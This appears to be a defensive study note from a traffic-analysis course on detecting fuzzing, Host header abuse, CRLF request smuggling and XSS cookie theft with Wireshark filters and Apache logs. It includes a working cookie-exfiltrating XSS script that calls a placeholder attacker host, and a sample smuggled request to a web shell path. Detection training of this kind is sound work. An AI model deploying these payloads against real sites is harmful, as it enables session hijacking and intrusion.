name: HTTP Anomaly Detection — Fuzzing, Strange Headers, CRLF & XSS
description: HTTP traffic analysis for malicious activity: directory fuzzing (rapid 404s from one host), parameter/IDOR fuzzing (sequential ID modification), strange Host headers (virtual host confusion), CRLF/HTTP request smuggling (injected CR+LF to split requests), and XSS cookie theft (JavaScript exfiltrating cookies via GET requests). Also covers Apache access log analysis to correlate Wireshark findings.
source: CDSA Module 08: Intermediate Network Traffic Analysis
notes:
=== DIRECTORY FUZZING DETECTION ===
How it works:
  → Attacker uses tools (ffuf, gobuster, dirb) to probe all possible web paths
  → Sends rapid HTTP GET requests for paths that don't exist
  → Discovers admin pages, backup files, config files, upload directories

Wireshark detection:
  # All HTTP traffic
  http
  
  # Only HTTP requests (filter out server responses)
  http.request
  
  # Filter to suspected scanner IP
  http.request and ((ip.src_host == <SCANNER_IP>) or (ip.dst_host == <SCANNER_IP>))
  
  # Look for 404 responses (not found = probed path doesn't exist)
  http.response.code == 404

Apache log correlation:
  # Filter by attacker IP
  cat access.log | grep '<ATTACKER_IP>'
  cat access.log | awk '$1 == "<ATTACKER_IP>"'
  → Look for rapid GET requests to random filenames within same second
  → Pattern: many lines with same timestamp, 404 response codes

Directory fuzzing IOCs:
  → One host sending many HTTP requests in rapid succession
  → Most responses are 404 (path doesn't exist)
  → URLs contain common wordlist entries: /.git/HEAD, /.bash_history, /admin, /backup
  → User-agent may be tool-specific (ffuf, gobuster, dirb)

=== PARAMETER & IDOR FUZZING ===
How it works:
  → Attacker fuzzes dynamic URL parameters: /user?id=1, /user?id=2, /user?id=3...
  → Looking for IDOR (Insecure Direct Object Reference) — access unauthorized data
  → Also fuzzes JSON body fields: change return=max to return=min

Wireshark detection:
  # Filter to specific host requests
  http.request and ((ip.src_host == <SCANNER_IP>) or (ip.dst_host == <SCANNER_IP>))
  → Follow HTTP stream on any request to see full request/response
  → Look for incrementing ID values in URL parameters
  
  # If attacker staggers requests (evasion) look at longer time window
  → Apply time filter or adjust capture duration

=== STRANGE HOST HEADERS ===
How it works:
  → HTTP Host: header tells web server which virtual host to serve
  → Attacker changes Host: to access restricted vhosts, localhost, or admin interfaces
  → Tools: Burp Suite, curl -H 'Host: admin'

Wireshark detection:
  # All HTTP then look for anomalous hosts
  http
  
  # Filter requests where Host != expected server IP/domain
  http.request and (!(http.host == "<SERVER_IP>"))
  → Expand packet: HTTP → Host header field
  → Look for: 127.0.0.1, admin, localhost, internal hostnames

# Filter HTTP 400 Bad Request (often from smuggling or bad headers)
http.response.code == 400

=== CRLF / HTTP REQUEST SMUGGLING DETECTION ===
How it works:
  → CRLF = Carriage Return (\r) + Line Feed (\n) = HTTP line separator
  → Attacker URL-encodes CRLF (%0d%0a) in request parameters
  → Server interprets as a second HTTP request → smuggled request
  → CVE-2023-25690 (Apache mod_proxy)

Smuggled request example (URL-decoded):
  GET /login.php?id=1 HTTP/1.1\r\n
  Host: 192.168.10.5\r\n
  \r\n
  GET /uploads/cmd.php HTTP/1.1\r\n   ← smuggled second request
  Host: 127.0.0.1:8080

Wireshark detection:
  # Find 400 responses (server rejected malformed request)
  http.response.code == 400
  → Follow HTTP stream on these → look for URL-encoded CRLF (%0d%0a) in request
  
  # If smuggling succeeds, look for 200 response to smuggled path
  http.response.code == 200
  → Cross-reference with paths that shouldn't be accessible

Apache config that enables smuggling:
  RewriteRule with [P] (proxy) + user-controlled path = vulnerable to CRLF injection

=== XSS COOKIE THEFT DETECTION ===
How it works:
  → Attacker injects JavaScript into web page (via comment, form, URL parameter)
  → JS runs in other users' browsers, sends their cookie to attacker's server
  → GET request: http://<ATTACKER_IP>:<PORT>/?cookie=<VICTIM_COOKIE>

Example injected script:
  <script>
    window.addEventListener('load', function() {
      const url = 'http://<ATTACKER_IP>:5555';
      const params = 'cookie=' + encodeURIComponent(document.cookie);
      const request = new XMLHttpRequest();
      request.open('GET', url + '?' + params);
      request.send();
    });
  </script>

Wireshark detection:
  # All HTTP requests going to external/unusual host
  http
  → Look for GET requests going to an IP that is NOT your web server
  → URL will contain: /?cookie=... or similar
  
  # Filter by attacker's exfil server IP
  http && ip.dst == <ATTACKER_EXFIL_IP>
  → Follow stream → see stolen cookie value in URL parameters

XSS IOCs:
  → HTTP requests to unexpected internal IP (attacker's listener)
  → URL contains 'cookie=' parameter
  → Many victims sending to same external IP in short time
  → Source web server has user-submitted content (comments, forms)

=== RESPONSE CODE REFERENCE ===
200 = Success
400 = Bad Request (CRLF/smuggling attempts)
403 = Forbidden (path exists but denied)
404 = Not Found (fuzzing non-existent paths)
500 = Server Error (injection/exploit attempt caused crash)
